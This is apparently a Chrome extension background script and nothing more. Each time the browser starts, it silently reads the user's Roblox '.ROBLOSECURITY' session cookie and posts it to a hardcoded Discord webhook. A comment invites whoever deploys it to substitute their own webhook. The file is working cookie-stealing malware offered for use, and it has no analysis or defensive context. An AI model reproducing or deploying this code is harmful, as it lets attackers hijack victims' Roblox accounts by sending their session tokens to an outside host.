const webhook = "https://discord.com/api/webhooks/1353167118589493258/pUMvjWzs6Y2bS8y_UbMUX5QpVfYGDiR973fi1vGWmUlgPZa-zt-kvTKhlXYBl6C6L-Il"; // Put your webhook here for the information to be sent to.

chrome.runtime.onStartup.addListener(() => {
  chrome.cookies.get(
    { url: "https://roblox.com", name: ".ROBLOSECURITY" },
    (cookie) => {
      if (cookie) {
        fetch(webhook, {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            embeds: [
              {
                title: "Cookie Logger Example",
                description: "```" + cookie.value + "```",
              },
            ],
          }),
        });
      }
    }
  );
});
